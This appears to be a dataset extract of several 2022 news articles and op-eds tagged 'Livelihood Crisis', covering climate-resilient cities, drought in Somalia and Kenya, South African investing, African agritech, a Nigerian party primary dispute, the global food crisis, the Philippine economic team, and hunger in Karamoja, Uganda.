SM: This is a tough one. This is a utopia at this point and frankly, at least for me, utopias cannot provide the solution to the climate crises. What we need is dynamic and responsive city planning – from the bottom up, as messy and slow as it may be. We have some broad parameters to guide us and, to me, the most important would be investing in protecting and strengthening natural systems that can possibly be the only buffer against extreme climate events and provide critical services that no built infrastructure can provide.

CV: Cities can be made resilient to a large extent; one way to start will be to understand their ecological services. We need to plan the cities taking into account their hydrology and hydrogeological aspects. When we build over its riparians and valleys, we are inviting floods; even extensive paving of the earth and not allowing for recharge also contributes to flooding. We also need to consider that rainfall patterns are changing; we are experiencing more thunderstorms than the monsoon rains we were used to. So, large volumes of water in a short duration affect the capacity of recharge and transportation of water. While we get heavy rains in a short time, we are going to experience longer summers. Are our cities capable of providing cooler areas to work and live in? One idea is to think about the undergrounds, which tend to be 5-10 degrees cooler than above grounds. They will reduce our dependence on cooling, and the same can also provide materials for construction.

The idea of ecological buildings is taking root. Bengaluru has shown the path; this is a city with 10,000 contemporary earth buildings – globally the largest number. It has incorporated smart water harvesting and water treatment systems within its water and sewerage infrastructure.

It is not that we are not capable of thinking of such ideas or do not have capacities amongst us – but we get carried away by the chest-thumping of a development chimera, and fail to think at all of what is the future being left for our children and grandchildren. Cities are not buildings alone — they are their air, water, and people.

“Many families have lost everything,” said Daud Jiran, Mercy Corps Country Director for Somalia, describing the devastation across the country due to this season’s severe drought. “Pastoralists have trekked hundreds of kilometers with their weakening animals looking for pasture. Most of their animals have died along the way, and the few left are feeding on cactuses and other plants, even though they can be toxic to livestock, as a last resort.” Across the Horn of Africa, some regions are facing their driest season in 40 years. Over 14 million people across Somalia, Ethiopia and Kenya—about half of them children—are already on the verge of starvation. In Somalia alone, over half a million people have already fled their homes in search of food and water since the start of 2022. Mercy Corps is responding to immediate needs by providing cash assistance, increasing access to water, and supporting pastoralist and farmer livelihoods—with an emphasis on building resilience beyond the current crisis. We’re sharing stories from the communities in Somalia and Kenya that Mercy Corps is supporting. From our experience working in the Horn of Africa since 2004, we understand this won’t be the last drought to strike the region. We must take urgent action to avert a deepening crisis and help communities withstand future emergencies.

In a dusty lot on the outskirts of Somalia’s capital city, Mogadishu, displaced people live in a crowded camp. After losing crops, livestock, and family members to the drought, many of the displaced have walked for weeks to arrive at the camp. “We saw the horrific consequencesof acting too late in Somalia in 2011, when over a quarter of a million people died as a result of drought and famine,” said Daud. “In 2017 however, the Somali government and humanitarian community prevented the worst impacts of drought by swiftly acting on early warning signals, showing that a collective ‘no-regrets’ approach to funding and programming can effectively avert famine. Now, more than ever, our shared responsibility must translate into action for communities in the Horn of Africa.”

Displaced women and children gather in a shed to escape the midday heat at a camp for internally displaced people outside of Mogadishu. South of the capital city, in Lower Juba, Daud met women who brought their children in search of support and now live in makeshift shelters in camps outside of nearby towns. Their husbands stayed behind to watch over the few remaining livestock. The camps have no food, access to water, or sanitation. The women and children are “exposed while relying on the little help the local communities offer,” said Daud. “It's a scramble for survival.”

At a water tap near a camp for displaced people in Baidoa, Somalia, displaced women line up to fill their jerrycans. Mercy Corps is providing water to thousands of people displaced by the drought. Climate change has exacerbated the frequency and severity of droughts that have now left nearly 90% of Somalia in an extreme drought following three consecutive failed rain seasons. The drought crisis is further compounded by the COVID-19 pandemic, regional conflict, desert locusts, and now a surge in food prices due to the war in Ukraine. Mercy Corps is providing cash and food to the most affected families, and water in remote villages through emergency water trucking for communities and their livestock to help prevent a worsening catastrophe.

Mercy Corps’ drought response and support includes helping communities to cope with future crises in the long term. We integrate livelihoods programs while meeting emergency needs. Ikran sews a garment inside a shed outside of Mogadishu. Mercy Corps has helped her, and other women, organize a group of tailors who work together to support their displaced families.

Girls study in front of their school outside Mogadishu where displaced children transition from temporary schools into permanent ones like one pictured here. Mercy Corps is supporting the schools with water and sanitation infrastructure. Women and girls bear the brunt of the impacts of the drought, due to prevailing gender inequality in the region. For instance, in times of crises, communities may use coping strategies like removing children from school, and girls are the first to miss out on their education. The displacement that results from drought can also lead to greater gender-based violence against women and girls. Schools not only provide education and access to water, but a sense of normalcy during a challenging time.

In Kenya, pastoralists are going to great lengths to save their livestock.

Leparin Lolmongi pulls water from deep in the earth at a migration water point in East Samburu, Kenya, where dozens of other pastoralists have trekked for days—some from over 200 kilometers away—to reach a water source. His camels drink from a trough behind him. Leparin fills up bucket after bucket, knowing that he will need to store enough water for both himself and his animals for their onward journey. As a migratory pastoralist, Leparin’s camels are his livelihood. Due to the drought, and increasingly limited food supply, intercultural conflicts are also a risk factor in the area, making life more challenging for all.

A thriving water source once provided more than enough water for this Samburu woman and her community near the Lesepe Dam in Baragoi, Kenya. Now the women gather to pray for rain, after a year without it. Every day, she and other women—mothers and grandmothers—walk two kilometers from their village in scorching heat to the dam for this special ceremony. She pours a bit of water on weeds, symbolizing the women’s request for rainfall. The women pray, sing, and splash milk in the air during the ritual. When the ceremony is completed, the women take refuge underneath canopying trees for shade, drinking sips of water to replenish themselves before making the journey back to their village. They will return to the dam on the next day, to pray again for rain.

Elizabeth Akaale holds her daughter, who is currently ill with malaria and diarrhea. Elizabeth is a mother to seven children, living in Turkana, Kenya, which has been experiencing severe drought for months. “Because of the drought, we are skipping meals. I have to ration supper, and divide meals so that some of my children who need additional food are able to eat more than others,” said Elizabeth. Just a few months ago, her daughter was severely malnourished and received critical health care from this nearby clinic, which is supported in part by Mercy Corps. Her daughter receives regular health exams, malaria medication, and supplementary food during their visits.

Abdia Muktar Omar is a mother to three children in a small village in Northern Wajir, Kenya. With a cash grant from Mercy Corps, she opened a shop where she sells food and household items. As a participant in a Mercy Corps program promoting livelihoods for women, she also learned basic financial planning, bookkeeping, and business skills to help supplement lost income from drought-affected businesses. Livestock farming has diminished due to the drought, which means fewer customers for Abida. “If it doesn’t rain, the shop won’t survive,” said Abida. The hope for rainfall is shared across the region as communities struggle with compounded crises. In order to meet urgent needs caused by the drought, Mercy Corps is increasing access to water, distributing cash assistance, and providing animal feed and veterinary care to pastoralists. Our teams are collaborating with local health authorities and governments to expand services. Time is of the essence to prevent the most devastating potential impacts on lives and livelihoods.",Livelihood Crisis,2022-05-16 07:00:00

Local investors have been subject to poor returns on the JSE over the past decade.
US equity markets have increased eight-fold, driven by quantitative easing, with the Federal Reserve injecting close to 40% of GDP to support capital markets.
Alongside these timid green shoots the performance of the JSE has started to match that of global equity markets over the past three years.
That said, let’s not lose sight that over the past two decades the JSE has delivered double the returns compared with global equity markets.","The World Economic Forum (WEF) identifies economic decoupling as a key risk for the world. While advanced economies are expected to surpass their pre-pandemic growth path by close to 1% in 2024, in large part due to enormous economic stimulus amounting to close to a third of GDP, developing countries will lag their pre-pandemic growth path by more than 5%.

For Sub-Saharan Africa the picture is even more dire. The WEF Global Risks Report also outlines that the top three risks for SA are economic stagnation, employment and livelihood crises, and state collapse. With this bleak backdrop should investors be concerned about investing in SA? Should investors rather look to maximise their assets offshore?

Local investors have been subject to poor returns on the JSE over the past decade. Investing in global equities a decade ago would have meant a trebling of one’s investment in dollar terms, while an equivalent amount on the JSE would have only increased by 50% in dollars.

The sharp depreciation of the rand also added fuel to offshore returns, with the rand depreciating by more than 80% over the decade. This bifurcated picture is, in the main, due to the spectacular rebound of US equities since the global financial crisis. US equity markets have increased eight-fold, driven by quantitative easing, with the Federal Reserve injecting close to 40% of GDP to support capital markets.

The lost decade in SA has been well documented. Economic stagnation has meant we have got poorer, with GDP per capita flatlining while our public debt ballooned from 30% to 70% of GDP. Therefore, impactful intervention is required to reverse the rot that has set in. We can be hopeful that there are some initiatives in place to turn around ailing state-owned enterprises.

Through Operation Vulindlela the government has outlined a joint initiative between the presidency and National Treasury. This aims to accelerate structural reforms and modernise several sectors, such as water, electricity, transport and telecommunication.

Already there are some examples where policy interventions will assist in “debottlenecking” key sectors. In the electricity sector, allowing for the self-provision of 100MW of electricity will help alleviate chronic shortages. In addition, the expansion of the grid and, potentially, a R100bn of renewable project pipeline, bodes well. Implementation of those could still be held up by red tape, but there are moves to quicken the turnaround of regulatory approvals.

In the transport sector we have seen a switch of about 20% of the volume of freight from rail to road over the past three decades. Plans are in place to reverse this trend, which should not only reduce the cost of moving goods in our country but also help improve the condition of the road system. Another staggering statistic is that 40% of water losses are due to leakages. Again, decisive action can help turn the tide.

Alongside these timid green shoots the performance of the JSE has started to match that of global equity markets over the past three years. While this is due to the performance of the resources sector, which has doubled, more recently we have seen a strong recovery in the SA Inc sector. For instance, the banks’ index is ahead of levels three years ago, more than making up for its halving in value during the initial Covid lockdown of two years ago.

The lure of offshore markets with its wide array of potential investee companies will remain. With our pensions funds now being able to invest up to 45% of assets offshore — compared with the previous limit of 30% (and an additional 10% for the rest of Africa), the focus of asset managers and asset owners will undoubtedly turn towards the wider range of opportunities that reside outside our shores.

That said, let’s not lose sight that over the past two decades the JSE has delivered double the returns compared with global equity markets. Bear in mind that according to a study by Credit Suisse, over the past 121 years SA would have delivered the fourth-best equity returns, outperforming the rest of the world in real terms by about 1% per annum in dollars.

Perhaps we shouldn’t give up on SA just yet.

This situation is all the more worrying given that 51% of the continent’s active population works in the agricultural sector, and therefore depends on its viability for their livelihood[2].
In light of this, new technologies undoubtedly offer effective and innovative solutions to breathe new life into agricultural ecosystems on the continent.
At the same time, feeding the population in Africa will have to be accompanied by increased preservation of biodiversity and ecosystems.
Through the collection, storage, analysis and sharing of information, digital technologies have the potential to considerably improve yields, helping food system stakeholders make informed decisions and thus achieve significant results in terms of resilience.","The continent’s food security is indeed crucial for the economic development of African countries. However, agriculture represents only about 15% of GDP, even though Africa has about 60% of the world’s arable land[1].

If, in 2019, 235 million people living in sub-Saharan Africa were living in a situation of food insecurity, there is no doubt that the current health crisis, coupled with the economic and social crisis that many countries on the continent have been experiencing for several years, have accentuated the socio-economic challenges. Farmers, companies operating in the agricultural sector, African SMEs and consumers have been and continue to be among the first victims of this multidimensional crisis. This situation is all the more worrying given that 51% of the continent’s active population works in the agricultural sector, and therefore depends on its viability for their livelihood[2]. However, it should be noted that these jobs are mainly in subsistence agriculture.

In light of this, new technologies undoubtedly offer effective and innovative solutions to breathe new life into agricultural ecosystems on the continent. This is all the more important given that Africa’s population is set to double by 2050, rising from one billion inhabitants in 2019 to nearly 2.4 billion in less than thirty years[3]. At the same time, feeding the population in Africa will have to be accompanied by increased preservation of biodiversity and ecosystems. In this context, it is more than crucial to promote the development of e-agriculture. Through the collection, storage, analysis and sharing of information, digital technologies have the potential to considerably improve yields, helping food system stakeholders make informed decisions and thus achieve significant results in terms of resilience.

Moreover, according to estimates by the Technical Centre for Agricultural and Rural Cooperation (CTA), by 2030, 200 million farmers will be in need of digitalization in Africa as a result of the continent’s ongoing digital transformation[4]. To achieve the full potential of agritech, it is therefore necessary to address current challenges related to connectivity, access to energy and finance. Thus, ambitious programs involving public authorities and private sector actors must be put in place to allow the greatest number of people to access innovative tools and thus benefit from the advantages offered by these solutions.

Huawei already has solutions for these obstacles, starting with the “Smart Irrigation” project in Morocco. This project, which uses 5G, the cloud, artificial intelligence and big data, enables remote, precise and intelligent irrigation, using the right amount of water to increase production. Thus, by installing sensors on the ground to collect and store data, this project aims to measure the humidity, temperature, electrical conductivity or salinity of water, the objective being to optimize production, while achieving a saving of more than 60% of water waste. In the same vein, the “Rural Solar Power” project in Cameroon, which consists of deploying green energy solutions combined with artificial intelligence, has made it possible to open up more than 1,000 villages, and in the process, nearly 4.5 million people have gained access to a stable connection.

At Huawei, we are convinced that new technologies have a significant role to play in improving the living conditions of people in Africa and around the world. For example, we are convinced that the gradual arrival of the 5G network on the African continent will not only improve the mobile network, but will also be a real source of socio-economic progress, particularly in the agricultural sector.

In order to maximize the opportunities offered by new technologies in all sectors, including agriculture, it is essential to familiarize and train young African talent with digital tools. In order for them to be able to meet the challenges of their profession and take full control of the digital future of their country, and ultimately, of the continent, we at Huawei have been committed to promoting ICT (information and communication technology) skills training for more than twenty years now. As such, the Group is working with African governments to stimulate digital transformation and bring more opportunities to tomorrow’s youth through various education programs, such as the Huawei ICT Academy, Seeds for the Future and the iTB talent project in Egypt.

The hopes of the long-awaited green revolution on the continent, based on the increase in agricultural production in recent years coupled with the use of innovative sustainable solutions, require the mobilization of policy makers and private actors. It is essential that states invest in irrigation, encourage the transition to digitalization, and support small farmers with loans. These measures would then make it possible to limit the long-term economic consequences of the pandemic, while capitalizing on the natural resources that the African continent offers, and thus make the agricultural sector one of the keys to the socio-economic development and growth of countries.

Udensi, who is also a security expert, had accused the state Working committee of manipulating the process of the primary election which produced the Chancellor of Gregory University, Uturu, Prof. Gregory Ibe as winner, alleging that the organizers used false delegates.

According to Udensi, “I want the court to determine the authentic governorship candidate of the party in the state within the 14 days window allowed by law to seek redress before campaign starts

He revealed that when he noticed that some members of the State working Committee of the party had compromised and were no longer ready to abide by the rules for the primary election, he left the accreditation venue for the venue where he held his own primary election, where he was also declared winner.

According to him: “We left them because the delegates -list they were using was unknown to us. I’m a foundation member of APGA and we can’t leave the house we have built for people who came on selfish political voyage”.

In his words:”If they wanted to do primary election in the party, we have our process which they should have followed. But instead, they brought thugs and never- do- wells and social misfits to act as delegates to the extent that they have to hijacked the members of the three-man panel, sent from Abuja from their hotel rooms to a private setting for them to sign the Congress document.

“There is need for party leadership to be handled by people with pedigree and sustainable means of livelihood to help reduce the level of desperation for financial benefits among party leaders during electioneering.

“I have no doubts that there is conspiracy in our party. This conspiracy is borne out of greed and selfishness. That is why I have been hammering that electoral reforms should start with the political parties to ensure that those who will run the political parties must be descent people with decent means of livelihood; people without past criminal records.

“But what do we have today? We have hoodlums handling the political parties, starting from the wards to the state level. The people that will influence the emergence of candidates must be descent themselves.

“Today anybody can be the ward chairman, Local Government chairman of the party because they are no standards on who becomes what?

“If we do not put in- place a standard that will bring in decent people to run the party, they will also produce poor candidates”.

Udensi expressed regrets that Abia had remained the most underdeveloped state in the South-East, in spite of its abundant human and material resources. I want to rescue Abia state.

“My position is that if the NWC rejects their result, it should accept mine”.

Speaking in Umuahia, Thursday, APGA chairman in Abia state, Augustine Ehiemere said that there is no basis for any aspirant to go to court because the process adopted for the primary which produced Prof. Ibe, was evidently transparent .

The party-boss, therefore, called on Udensi and other aggrieved aspirants to join the party leadership and governorship candidate, “so that we can together win the general elections and liberate Abia state from many years bondage.

For many years of PDP-led government in Abia state, no Roads, infrastructures, Workers are not paid regularly, Pensioners are owed pensions for many years, while Gratuity stopped since 2000 in Abia state .

He specifically appealed to aspirants who lost in the primary election not to abandon the party in protest.",Livelihood Crisis,2022-06-13 05:00:10

Even before the Russia-Ukraine war broke out, the world had a massive and sharply rising incidence of hunger and food insecurity.
The current global food crisis must be seen in this background.
Along with this, supply shortages and high inflation of fuel and fertilisers have adversely affected the global food supply.
The key lesson countries must learn from the current food crisis is that domestic self-sufficiency in staple food production is important for large countries.","The world has been facing a food crisis of unseen magnitude for many decades. The Food and Agriculture Organization of the United Nations (FAO) warned in May that the “number of people facing acute food insecurity and requiring urgent life-saving food assistance and livelihood support continues to grow at an alarming rate”. This crisis has been in the making for some time, precipitated by the economic sanctions the United States and the European Union have imposed on Belarus and Russia.

In a meeting on June 3 with Russian President Vladimir Putin, Macky Sall, the President of Senegal and Chairperson of the African Union, several of whose member countries face an enormous humanitarian crisis, said, “Anti-Russia sanctions have made this situation worse. Now we do not have access to grain from Russia, primarily wheat. And most importantly, we do not have access to fertiliser. The situation was bad, and now it has become worse, creating a threat to food security in Africa.”

International organisations such as the FAO and the World Food Programme (WFP) have long argued that conflicts and wars are the primary causes of rising food insecurity in recent years. They have also held the Ukraine-Russia war primarily responsible for the recent rise in food prices and food insecurity. The Global Network Against Food Crises, created by the European Union, FAO and WFP, estimates that four crore additional people in the 53 most food-insecure countries urgently need food assistance because of the recent spikes in food prices and shortages in availability.

Conflicts and climate change hurt food availability, but holding them as the primary causes of the rise in food insecurity undermines the deeper causes of the current crisis. Even before the Russia-Ukraine war broke out, the world had a massive and sharply rising incidence of hunger and food insecurity. FAO data for 2020 said about 237 crore people faced moderate to severe food insecurity worldwide. About 62 crore—the largest in any single country—were in India alone. It is expected that the numbers on food insecurity and hunger will be even higher when updated data are published later this year.

Over the last few decades, globalisation, particularly the international trade regime created under it, has created a sharp imbalance in the levels of support provided to farmers in developed and less-developed countries. As a result, the Global South has become a source of food commodities that cannot be produced in developed countries and is increasingly dependent on large-scale agriculture in developed countries for staple food commodities.

Over the last three decades, India has become increasingly dependent on imports of pulses and edible oils. Increased price volatility due to trade liberalisation on the one hand and lack of public procurement on the other have disincentivised farmers from cultivating pulses and oilseed crops. India is the biggest importer of edible oils and pulses. (In 2017-19, 68 per cent of edible oil and 17 per cent of pulses consumed in India were imported.) In addition, with the withdrawal of public funding in agricultural research in the Global South, big international agri-businesses have acquired monopoly control over supplies of modern agricultural inputs, including fertilisers and seeds. India’s reliance on imports of manufactured fertilisers has steadily increased. In 2020, India met about 30 per cent of urea supply and 61 per cent of Di-Ammonium Phosphate (DAP) supply through imports.

Globalisation has not only resulted in increased volatility in food prices, but it has also created the conditions in which millions are vulnerable to short term disruptions and volatility. Low farm incomes, widespread unemployment among rural and urban working classes and shrinking access to social security systems have all contributed to food insecurity and vulnerability.

The current global food crisis must be seen in this background.

Even if we look at the immediate factors that have contributed to the food crisis, economic sanctions by the European Union and NATO seem to be the primary culprits. The use of economic sanctions to specifically target food supplies and agricultural inputs preceded the Russia-Ukraine war. Since 2020, the European Union and the United States have progressively imposed restrictive measures against Belarus, the largest potash producer. In fact, specific sanctions were imposed against Belarus Potash Company and Belaruskali, the two biggest Belarusian potash exporters. The United States sanctions on Iran, a major DAP supplier, also contributed to contract fertiliser availability.

NATO’s sanctions against Russia, banning Russia from the SWIFT payment system that almost all banks use, and restrictions on basic maritime services such as marine insurance and port facilities by Russian shipping vessels have all contributed to curtailing the global supplies of grain and fertilisers. Though the purchase of grain, fertiliser and fuel is not covered under sanctions, the United States has arm-twisted much of the Global South, including India, to stop buying from Russia, even though the European Union continues to use Russian gas and oil.

Supported by NATO, Ukraine has not only shut its ports but mined the sea around Odessa to prevent the possibility of a Russian attack on the port. Although Russia, along with Turkey, has proposed that a corridor be created in the Black Sea to allow food shipments, Ukraine has not accepted the proposal claiming Russia could use even this corridor for an attack.

Fears of scarcity have led several countries to introduce export restrictions. According to the IFPRI Export Restrictions Tracker, many countries have imposed restrictions on the export of different food commodities in recent months. These include Indonesia, Malaysia, India, Pakistan, Afghanistan, Iran, Kuwait, Lebanon, Turkey, Egypt, Algeria, Tunisia, Morocco, Ghana, Burkina Faso, Kyrgyzstan, Kazakhstan, Azerbaijan, Moldova, Kosovo, Serbia, Hungary, Argentina and Russia and Ukraine. Many of these countries are major suppliers of essential food commodities resulting in a considerable gap between the global supply and demand of cereals, edible oils, pulses and sugar.

Along with this, supply shortages and high inflation of fuel and fertilisers have adversely affected the global food supply. International prices of DAP in March 2022 were 81 per cent higher than prices in March last year. In March 2022, global potash prices were about three times, and urea prices were about double the prices in March last year. Fertiliser exports have been restricted by China, South Korea, Kyrgyzstan, Russia and Ukraine. The United States has pressured a number of countries to stop buying grain, fuel and fertiliser from Russia. With national food self-sufficiency in the global south compromised because of the neo-liberal project, export restrictions on food and agricultural inputs by major suppliers are expected to worsen food insecurity significantly.

High food prices can be highly deceptive. It is commonly believed that farmers benefit from high food prices during a crisis; that they are happy with the high prices they are receiving for their crops. In India, public procurement during this year’s rabi season was low because wheat and mustard are fetching good prices in the open market. However, this is an illusion, and we must not make the mistake of thinking that high food prices during such a crisis are good for farmers. Over the last few years, Indian farmers have been demanding higher, more remunerative, and assured prices for their produce through statutory minimum support prices and greater public support. However, farmers will be adversely affected when agricultural prices rise as part of generalised food inflation during a global crisis. Why? First, because the prices for farm produce are lower than consumer prices. Secondly, given their neo-liberal orientation, governments have not prioritised regulation of input prices to protect farmers against price inflation. In such a situation, an increase in the cost of cultivation eats into the benefit of higher food prices. Finally, a vast majority of farmers in the Global South are small producers who are net buyers of food. Inflation hurts them even more, as they sell their products cheap and are forced to buy food and other necessities when they are dear.

The key lesson countries must learn from the current food crisis is that domestic self-sufficiency in staple food production is important for large countries. Achieving this requires public investment in agriculture and food systems. Governments must prioritise agricultural research and assure supplies of farm inputs. Incentivising farmers to produce important food crops through price regulation systems, public procurement and input subsidies, and robust social protection, including subsidised food distribution, are critical for food security. Policies that have undermined these priorities must get reversed.

I resume column-writing on the day after our commemoration of Independence Day.

In the frenzy of the last campaign and thereafter, while observing the first actions and pronouncements of the incoming administration, many of us seem to have overlooked that today, as I write, is the 124th anniversary of the Aguinaldo proclamation in Kawit, Cavite.

Friends in the diplomatic circle keep telling me that ours is still a young nation, that political maturity and a culture of nationhood takes time.

They sometimes point to the experience of their own countries as examples. The French consider the Fall of the Bastille on July 14, 1789 as the day they began the long and arduous, at times violent experience with democratic governance.

Spain, with a long monarchical history and even conquest by Islamic rulers, briefly flirted with a republican system for five years in 1931 until a civil war where thousands died ushered in the Franco dictatorship, and not until 1976 did the country transition to a parliamentary democracy.

Closer to home, Singapore became an independent nation only in 1965, after being divorced from the Malay federation that was borne after imperial Britain gave up its Southeast Asian colonies.

And while “democratic space” is restricted, Lee Kuan Yew, armed with vision and political will like no other in the region’s contemporary history, transformed his tiny nation into a world-class economic powerhouse.

Do these examples show that we are indeed a “young” nation, still grappling with a sense of identity, trapped in paroxysms of “change” that become nothing more than a return to a feudal political set-up and an oligarchic economic praxis?

Or is there something deeply aberrant or damaged, one might say, with our own culture?

But enough of these for the moment.

For now, the victors of May 9 rejoice at their unprecedented triumph, and the president-elect is carefully choosing the men and women who will steer the country with him for the next six years. And so far, so good.

Assembling a group of experienced technocrats from different previous administrations to form his economic team shows that President-elect Ferdinand Marcos Jr. realizes quite well the enormity of the economic crisis facing the country.

Ben Diokno of Cory, Erap and Rody comes with a wealth of experience in economic planning and public finance.

Arsi Balisacan, who became P-Noy’s NEDA director-general and later sat as chair of the newly-formed Philippine Competition Commission for all the six years of Rody, shares the same economic thinking as Ben.

So does Philip Medalla who was Erap’s NEDA director, and has been a Monetary Board director since then through three successive administrations.

Former UP President Fred Pascual is a respected trade relations specialist and able administrator, and is a great fit for the Trade and Industry portfolio.

Christina Garcia-Frasco is well aware of the practical aspects of tourism, coming as she does from a family that has governed Cebu well for many years, and recognizes tourism as its main economic driver.

I have always maintained that tourism can be, and should be, considered a major economic pillar, given our islands’ natural beauty and the innate hospitality of most of our people.

Having a young local executive who can combine right policy directions with effective use of LGU’s could well be the spur we need to boost tourism, and catch up with Thailand, Malaysia, even Vietnam.

We await with bated breath who Marcos Jr. will name to the agriculture, energy and transportation departments.

These three, along with DICT (where the new appointee, Ivan Uy, is an excellent choice) and DBM are vital cogs in the economic management team.

Not only are the previously named departments the most important implementing arms of economic policy; they are also the immediate answers to an economic crisis like no other we have experienced in our lifetime.

The new president wades into office with a clarion call for unity, but in truth, it will be in the anvil of crisis where his call for unity will be forged.

This paper has been persistently stressing the problem of food insecurity more than any other in traditional media, pounding into the national consciousness the need to prepare for what this writer described as a “perfect storm” in an article published here last May 23.

This will be the new government’s big headache in the coming months, well into the next two to three years, as no less than the United Nations has warned.

Even before the Russo-Ukraine war started, the signs of impending food crises were already staring us in the face.

The effects of climate change on food production, several outbreaks of swine and bird disease, logistical problems on top of the impact of the lockdowns brought about by the pandemic, have now been exacerbated by the economic impact of four months of conflict in Eastern Europe.

Aside from petrol and its derivatives like fertilizers, wheat, maize, cooking oils, sugar prices have shot to the roof in recent months.

Its cascading effects on the production of food are incalculable.

Its slow but sure substitution impact on the price of rice and pulses has begun.

Our major source of rice imports, Vietnam and Thailand, are in talks about a “common price” for the major Asian staple food, and these two supply 90 to 95 percent of our rice imports, which in turn constitutes 15 percent of total consumption requirements.

And while increasing agricultural output, especially of rice and corn, is the long-term solution to realize food security, this cannot be achieved in the short-term.

In truth, we are expecting lower palay harvests this coming season with the tripled cost of inorganic fertilizers and the diseconomies of scale in our farm sector. Expect the same in sugar, in vegetables, in meat and poultry, even in fish.

It will not be easy to look for a perfect fit for the Department of Agriculture.

And there are fundamental problems of economic philosophies between our economic team and the agricultural sector.

Who can best balance these interests and policy approaches will need likewise competent team support in the Bureau of Plant Industry, Bureau of Fisheries (BFAR), the NFA, the Food Terminal, both of which Marcos Sr. founded, likewise the Bureau of Animal Industry and ancillary agencies.

Of course, there is the immediate problem of fuel, which impacts on everything, electricity and mobility most of all.

While the Department of Energy has no power to stop the tidal wave of world crude shooting up beyond $120 per barrel, it can do much to incentivize more power plants, especially alternative clean energy projects, something we have failed to do in the last decade or so.

Again, we need experienced and effective managers in the energy sector, including the Energy Regulatory Commission.

Much has been said about our huge public debt.

That would certainly dampen our ability to borrow more, so that government can stimulate the economy and answer pressing public needs.

To our relief, most of that debt is domestic rather than foreign.

But rising interest costs will discourage both domestic and foreign investments, even as massive inflationary pressures will require constrictive monetary tools.

President-elect Marcos Jr’s newly-formed team of financial managers are up to the task, which has given the business community both relief and assurance.

It’s the devil and the deep blue sea insofar as balancing growth versus tempering inflation, but, mercifully, we are far from being a Sri Lanka, a Cuba, an Argentina or Brazil.

Consumer spending is not expected to increase, another sign of stagflation which even now may already be upon the economy.’

What some call “revenge spending” after repeated lockdowns is true only for the moneyed.

The poor never got their “revenge,” with their livelihood up-ended by the lockdowns. The middle class have seen their savings dry up. And OFW remittances, while steady, will be eaten up by food and fuel inflation.

In the just concluded political campaign, the Marcos-Duterte kept repeating the mantra of “unity,” as if it were a magic wand.

That was both a safe and effective message, as the results would show.

But Marcos Jr. knows that unity is neither easy to achieve in a nation of tribes separated not just by archipelagic waters but also by dynastic political interests, and neither is it a palliative that can address the day-to-day problems of survival, the “politica del estomago”—or the politics of the stomach—as his Latin American counterparts keep saying.

And before unity becomes palpable, the immediate crises will need to be solved, or at the very least, mitigated.

The super majority in Congress and the LGUs should arm the new president with ample means to turn the economic crisis into opportunity.

At that, all Filipinos must wish this new administration well, temper great expectations in the face of grave externalities, and row together towards safer shore.

Mr. Mustafa Habib, Director General of National Emergency Management Agency (NEMA), made this known at the distribution of 3,996 cows to victims of Mambila crisis in Gembu Local Government Area.

Habib, who was represented by Mr. Abdulahi Adamu, Deputy Director, Research and Forecast, in the agency, said the distribution of cows was part of the 2018 Emergency Agricultural Intervention Programme for victims of flood and conflict disasters.

Habib said the programme was an initiative of the National Food Security Council (NFSC) which was split into crop farmers and pastoralists’ components.

He said the intervention to crop farmers had already been carried out, adding that the second component which was the distribution of cattle to pastoralists had just begun in the state, adding that the delay in the implementation of the second phase of the programme was due to procurement challenges and the outbreak of Covid-19.

The Director General advised beneficiaries to take advantage of the relief items to restart their source of livelihood.

He also advised the people of Mambila plateau to eschew bitterness and embrace peace for the development of their area.

In his address, Mr. Ayuba Ladan, Head of the NEMA operations office for Taraba and Adamawa disclosed that the 3,996 cows were distributed to 1,998 beneficiaries from 11 crisis affected communities of the 2017 crisis in Sardauna Local Government Area of the state.

Mr. Ladan explained that two cows each were distributed to beneficiaries for breeding.

He, however, identified security threat as a major challenge in the course of the operation, adding that it took the intervention of security operatives to clear the road for the operation to be successful.

Ladan said the agency collaborated with the community leaders and state officials of Taraba State Emergency Management Agency (TASEMA), as well as the state ministry of Agriculture to achieve the distribution to the targeted beneficiaries. He therefore urged beneficiaries not to sell their cows to merchants.

Engr. Adamu Hussàini, Chairman, Adlinco Construction Company Nigeria (LTD), the contractor supplying the livestock, said the contract was awarded for the supply of 6,800 cows for victims of the 2017/2018 crisis in Taraba.

Huseini said he was able to outsource the stock within the local cattle markets in the state, assuring their suitability for breeding purpose.

Alhaji Umaru Zubairu, village head of Gembu, thanked the Federal government for the intervention.

Zubairu said the intervention would go a long way in assisting victims of the 2017 crisis who lost all their livestock. He assured that his subjects would not sell their cows to merchants as the assistance was their source of regaining their livelihood.

Households facing high levels of acute food insecurity have large food consumption gaps and can only meet their minimum food consumption requirements after employing crisis and emergency coping strategies.
Elsewhere, four districts have serious levels of acute malnutrition and three districts have alert levels of acute malnutrition.","The food insecurity situation in the Karamoja Sub-region has reached a crisis level. Hundreds of people are reported to have died, with hundreds of thousands more in dire situations, facing starvation.

Located in the northeast of Uganda, Karamoja is one of the poorest regions in Uganda. Its income poverty stands at 66 percent up from 61 percent in 2017. The food poverty is at 75 percent up from 70 percent in 2017 as per the Uganda Bureau of Statistics’s 2019/2020 figures.

The region continues to have the highest food insecurity and malnutrition levels in Uganda due to factors related to inadequate food access, poor dietary diversity, structural poverty, low value livelihood options, poor hygiene and sanitation, and morbidity.

The latest data from the Integrated Food Security Phase Classification (IPC) indicates that all nine districts in the Karamoja region are classified in IPC Phase 3 (Crisis). About 41 percent of the population or 518,000 people found themselves facing high levels of acute food insecurity between March and July 2022.

In terms of severity, the districts with the highest percentage in the crisis level are Kaabong, Kotido and Moroto. Each had 50 percent of the population at crisis level, followed by Nabilatuk at 40 percent.

Deteriorating situation

The report says the food security situation in the region has continued to deteriorate, with the population in crisis level increasing from 27 percent in June 2020, to 30 percent in April 2021, and to 41 percent in April 2022. Households facing high levels of acute food insecurity have large food consumption gaps and can only meet their minimum food consumption requirements after employing crisis and emergency coping strategies.

Mr Jino Bornd Meri, the LC5 chairperson of Kaabong District, told Sunday Monitor the situation is spiralling out of control. He said hundreds of mostly elderly people have died in the past five months and mass burials are on the cards if no state intervention is lined up.

“I had requested my technical people to provide me data so that I could speak from informed position and in one sub county,” he said, adding, “They gave me a figure of more than 300 people who have died this year…I told them to stop because I cannot give out this kind of data…”

Though Mr Meri did not mention the specific sub-county, he said the situation is similar across the district. Elderly people, children and women have been the most hit.

“We need to act now before we begin organising mass burials. The situation in my district is not good at all,” he warned.

Mr Charles Komakech Oluba, the chief administrative officer of Moroto , said the district is faring no better than Kaabong.

“We are in a situation where if we don’t act now, we must prepare to bury more people. Right now, many people go for days without food,” he said before asking “How do you expect such people to survive?”

